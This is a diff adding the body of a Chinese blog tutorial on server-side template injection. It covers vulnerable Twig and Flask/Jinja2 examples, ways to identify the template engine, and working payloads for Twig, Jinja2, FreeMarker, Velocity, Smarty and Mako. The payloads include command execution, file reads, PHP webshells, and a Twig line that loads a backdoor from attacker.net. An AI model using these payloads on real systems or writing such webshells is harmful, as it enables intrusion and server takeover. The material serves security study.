@@ -8,18 +8,33 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>SSTI服务端模板注入攻击学习总结 | 1u0Hun博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00 前言 0x0 参考 https://portswigger.net/blog/server-side-template-injection">
+  <meta name="description" content="0x00 前言SSTI（Server Side Template Injection），即服务端模板化注入，其原理是服务端web应用使用模板引擎渲染用户请求的过程，与其他注入相似，都是接受了用户的输入，将其作为web应用模板内容的一部分，在进行模板渲染的过程中，执行了用户插入的数据，因而导致了安全风险，可能造成敏感信息泄露，代码执行等问题，当前广泛使用的模板引擎有Twig，Jinja2、Smart">
 <meta name="keywords" content="SSTI注入 web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI服务端模板注入攻击学习总结">
 <meta property="og:url" content="http://yoursite.com/2018/09/13/SSTI服务端模板注入攻击学习总结/index.html">
 <meta property="og:site_name" content="1u0Hun博客">
-<meta property="og:description" content="0x00 前言 0x0 参考 https://portswigger.net/blog/server-side-template-injection">
+<meta property="og:description" content="0x00 前言SSTI（Server Side Template Injection），即服务端模板化注入，其原理是服务端web应用使用模板引擎渲染用户请求的过程，与其他注入相似，都是接受了用户的输入，将其作为web应用模板内容的一部分，在进行模板渲染的过程中，执行了用户插入的数据，因而导致了安全风险，可能造成敏感信息泄露，代码执行等问题，当前广泛使用的模板引擎有Twig，Jinja2、Smart">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-09-13T10:37:33.633Z">
+<meta property="og:image" content="http://yoursite.com/img/1537492989429.png">
+<meta property="og:image" content="http://yoursite.com/img/1537493189049.png">
+<meta property="og:image" content="http://yoursite.com/img/1537493976072.png">
+<meta property="og:image" content="http://yoursite.com/img/1537494385530.png">
+<meta property="og:image" content="http://yoursite.com/img/1537495672556.png">
+<meta property="og:image" content="http://yoursite.com/img/1537498942179.png">
+<meta property="og:image" content="http://yoursite.com/img/1537499026753.png">
+<meta property="og:image" content="http://yoursite.com/img/1537499184978.png">
+<meta property="og:image" content="http://yoursite.com/img/1537500590025.png">
+<meta property="og:image" content="http://yoursite.com/img/1537500814330.png">
+<meta property="og:image" content="http://yoursite.com/img/1537501062388.png">
+<meta property="og:image" content="http://yoursite.com/img/1537501238215.png">
+<meta property="og:image" content="http://yoursite.com/img/1537505824688.png">
+<meta property="og:image" content="http://yoursite.com/img/1537505860152.png">
+<meta property="og:updated_time" content="2018-09-21T06:55:24.829Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSTI服务端模板注入攻击学习总结">
-<meta name="twitter:description" content="0x00 前言 0x0 参考 https://portswigger.net/blog/server-side-template-injection">
+<meta name="twitter:description" content="0x00 前言SSTI（Server Side Template Injection），即服务端模板化注入，其原理是服务端web应用使用模板引擎渲染用户请求的过程，与其他注入相似，都是接受了用户的输入，将其作为web应用模板内容的一部分，在进行模板渲染的过程中，执行了用户插入的数据，因而导致了安全风险，可能造成敏感信息泄露，代码执行等问题，当前广泛使用的模板引擎有Twig，Jinja2、Smart">
+<meta name="twitter:image" content="http://yoursite.com/img/1537492989429.png">
   
     <link rel="alternative" href="/atom.xml" title="1u0Hun博客" type="application/atom+xml">
   
@@ -191,9 +206,71 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>0x00 前言</p>
-<p>0x0 参考</p>
-<p><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></p>
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>SSTI（Server Side Template Injection），即服务端模板化注入，其原理是服务端web应用使用模板引擎渲染用户请求的过程，与其他注入相似，都是接受了用户的输入，将其作为web应用模板内容的一部分，在进行模板渲染的过程中，执行了用户插入的数据，因而导致了安全风险，可能造成敏感信息泄露，代码执行等问题，当前广泛使用的模板引擎有Twig，Jinja2、Smarty、Freemaker、Velociy。</p>
+<h1 id="0x01-漏洞形成原理"><a href="#0x01-漏洞形成原理" class="headerlink" title="0x01 漏洞形成原理"></a>0x01 漏洞形成原理</h1><p>由于部分开发者对于使用模板引擎并没有形成良好的开发习惯，任意使用非标准开发实现效果即可，因此可能存在直接拼接用户的输入作为模板的内容，以下面使用Twig代码为例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;$_GET[&apos;name&apos;]&#125;&quot;);  // 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
+<p>可以看到此时，开发者直接将GET请求参数name拼接到模板并作为模板输出，此时安全人员就可以拼凑恶意代码来进行测试，先使用常规的功能测试</p>
+<p><img src="\img\1537492989429.png" alt="1537492989429"></p>
+<p>可以发现确实可以输出用户输入的正常数据，证明功能确实可行，此时再注入前端HTML，JS语句尝试，看模板是否执行</p>
+<p><img src="\img\1537493189049.png" alt="1537493189049"></p>
+<p>此时证明注入前端语句确实可以被模板加载并执行，但是作为一个服务端模板攻击，怎么可以只满足于前端语言注入，但是此时我们会有一个疑问，在渗透测试中，仅仅凭借一个反射型XSS是不能够确定其为SSTI，因此在扩大攻击前，首先要确定其为服务端模板攻击</p>
+<h1 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h1><p>可以通过模板引擎的语法来进行判断，一般常见的模板引擎测试语法如下</p>
+<p><img src="\img\1537493976072.png" alt="1537493976072"></p>
+<p>通过对模板引擎语法的了解，可以使用burpsuite来进行fuzzing确定是哪种模板或者仅仅只是普通拼接输出</p>
+<p>在这里我们尝试用NaN来判断，通过上图我们知道这个语法在Jinja2以及Twig都是可以得到结果的，但是不同的是，Jinja2返回的结果是11111，而Twig是5，这个原因则是由于python与php语言的区别导致的，php会强制类型转换，将字符转换成数字int类型在与数字进行乘积，而python并不会</p>
+<p><img src="\img\1537494385530.png" alt="1537494385530"></p>
+<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>通过上图可以判断其为Twig模板，对于模板攻击的影响有多大取决于模板引擎的复杂度，此时只需要了解该模板语法就可以扩大攻击。Twig语法参考<a href="https://www.kancloud.cn/yunye/twig-cn/159454，通过对语法的了解，此时可以拼凑代码执行" target="_blank" rel="noopener">https://www.kancloud.cn/yunye/twig-cn/159454，通过对语法的了解，此时可以拼凑代码执行</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;   //代码执行</span><br><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;   //种植后门</span><br></pre></td></tr></table></figure>
+<p><img src="\img\1537495672556.png" alt="1537495672556"></p>
+<p>除了twig之外，其他的模板如果开发不当，都可能引起安全风险，都可能造成命令执行，以Flask的Jinja2为例</p>
+<p>Jinja2，是python的Flask框架提供的模板引擎，熟悉python web开发的对其一定不陌生，由于近几年python的快速发展，而作为其中优秀的轻量级框架Flask被广泛的程序员所喜爱，但是在开发的过程中，由于疏忽也可能造成安全漏洞，为了偷懒，优秀的开发郑师傅写下了一下404</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, render_template_string, request</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    exploit = request.args.get(&apos;exploit&apos;)</span><br><span class="line">    print exploit</span><br><span class="line"></span><br><span class="line">    rendered_template = render_template(&quot;SSTI.html&quot;, exploit=exploit)</span><br><span class="line">    print(rendered_template)</span><br><span class="line"></span><br><span class="line">    return render_template_string(rendered_template)</span><br><span class="line"></span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">    template = &apos;&apos;&apos;</span><br><span class="line">                &#123;%% block body %%&#125;</span><br><span class="line">                    &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;That page doesn&apos;t exist.&lt;/h1&gt;</span><br><span class="line">                        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &#123;%% endblock %%&#125;</span><br><span class="line">                &apos;&apos;&apos; % (request.url)</span><br><span class="line">    return render_template_string(template,</span><br><span class="line">        dir=dir,</span><br><span class="line">        help=help,</span><br><span class="line">        locals=locals,</span><br><span class="line">    ), 404</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>
+<p>乍一看，优秀必须优秀，短短的几行代码解决了404问题，但是仔细一看，貌似直接拼凑了点东西啊，任意输一个路径看看会返回什么</p>
+<p><img src="\img\1537498942179.png" alt="1537498942179"></p>
+<p>优秀，很优秀啊，很贴心的告知不存在该路径，但是貌似总觉得怪怪的，试试最近郑师傅教的模板注入</p>
+<p>第一步，检测是什么模板，通过下图也验证了之前第二节，可以看到确实是返回11111，就是Jinja2模板</p>
+<p><img src="\img\1537499026753.png" alt="1537499026753"></p>
+<p>第二步，明人不说暗话，首先来个xss，鼓励一下</p>
+<p><img src="\img\1537499184978.png" alt="1537499184978"></p>
+<p>第三步， 查看flask语法，找到可以利用的危险函数</p>
+<p>  1） 通过查看文档，发现flask 中存在内置属性<strong>class</strong>，可以返回当前变量的类名，以字符串为例，测试</p>
+<p><img src="\img\1537500590025.png" alt="1537500590025"></p>
+<p>  2）如果能够让类切换到操作文件或者命令执行的方法中就可以进行高端操作，于是通过翻看文档，发现存在</p>
+<p><strong>mro</strong>,其可以将类返回到父类，父类的父类，直到object类，显示了类的继承关系，返回一个元祖</p>
+<p><img src="\img\1537500814330.png" alt="1537500814330"></p>
+<p> 此时可以通过下标切换到object类，如果能够在通过object类找到所有的子类就可能完成高端攻击，此时<strong>subclasses</strong>做出了贡献，<strong>subclasses</strong>属性通过字面意思也看得出来是显示子类的意思</p>
+<p><img src="\img\1537501062388.png" alt="1537501062388"></p>
+<p>可以看到返回很多子类，意味着攻击面猛增，明显看到有一个file，应该就是文件操作的类，由于subclasses返回的是元组，同样找到file下标就可以利用该类来读取本地文件，由于是在windows下操作，随便读一下表示，如果是linux可以直接读取/etc/passwd</p>
+<p><img src="\img\1537501238215.png" alt="1537501238215"></p>
+<p>既然可以读，那么当然可以写，那就随手一个webshell,但是由于对&lt;??&gt;，&lt;%%&gt;进行过滤，但是对于script标签并没有进行过滤，因此可以写php的一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&quot;a&quot;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="\img\1537505824688.png" alt="1537505824688"></p>
+<p>使用菜刀连接</p>
+<p><img src="\img\1537505860152.png" alt="1537505860152"></p>
+<h1 id="0x04-其他模块引擎-扩展"><a href="#0x04-其他模块引擎-扩展" class="headerlink" title="0x04  其他模块引擎 扩展"></a>0x04  其他模块引擎 扩展</h1><h2 id="0x0a-Java模板引擎"><a href="#0x0a-Java模板引擎" class="headerlink" title="0x0a  Java模板引擎"></a>0x0a  Java模板引擎</h2><p>Freemaker是Java下最受欢迎的模板引擎，其同样会存在安全风险，存在templatemodel接口允许用户通过实现该接口来用new创建任意java对象，利用payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign</span><br><span class="line">ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<p>Velocity同样是Java下面的一个模板引擎，也存在可利用的方法和属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(class/object/string)：返回正在审查类或对象的ClassTool实例</span><br><span class="line">$class.type：返回被审查的类</span><br></pre></td></tr></table></figure>
+<p>验证漏洞的poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor() //延迟了5秒</span><br></pre></td></tr></table></figure>
+<p>利用payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+<h2 id="0x0b-PHP模板引擎"><a href="#0x0b-PHP模板引擎" class="headerlink" title="0x0b PHP模板引擎"></a>0x0b PHP模板引擎</h2><p>除了上述的Twig外，Smarty同样是PHP下优秀的模板引擎，可以通过$smarty来获取到环境变量，还可以通过getStreamVariable函数来任意读写文件</p>
+<p>读取文件payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<p>写webshell的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x0c-Python模板引擎"><a href="#0x0c-Python模板引擎" class="headerlink" title="0x0c Python模板引擎"></a>0x0c Python模板引擎</h2><p>除比较有名的Flask的Jinja2之外，Mako是python web的一个模板库，其遵循的哲学思想：</p>
+<p>Python is great scripting language ,don’t reinvent the wheel, your template can handle it ! </p>
+<p>但是同样存在安全风险，测试payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">import os</span><br><span class="line">x=os.popen(&apos;id&apos;).read()</span><br><span class="line">%&gt;</span><br><span class="line">$&#123;x&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05  参考文章"></a>0x05  参考文章</h1><p><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/28823933?from_voters_page=true" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933?from_voters_page=true</a></p>
+<p><a href="http://www.vuln.cn/6194" target="_blank" rel="noopener">http://www.vuln.cn/6194</a></p>
+<p><a href="http://docs.makotemplates.org/en/latest/usage.html#basic-usage" target="_blank" rel="noopener">http://docs.makotemplates.org/en/latest/usage.html#basic-usage</a></p>
+<p><a href="https://www.kancloud.cn/yunye/twig-cn/159462" target="_blank" rel="noopener">https://www.kancloud.cn/yunye/twig-cn/159462</a></p>
+<p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
 
       
 
@@ -461,6 +538,10 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Love</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">SSRF WEB安全</a>
               </li>
              
@@ -469,11 +550,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Love</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">注入 web安全</a>
+                <a href="javascript:void(0)" class="js-tag color4">逆向 二进制安全</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -481,11 +558,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">windows</a>
+                <a href="javascript:void(0)" class="js-tag color4">注入 web安全</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">二进制安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">windows</a>
               </li>
              
               <li class="article-tag-list-item">
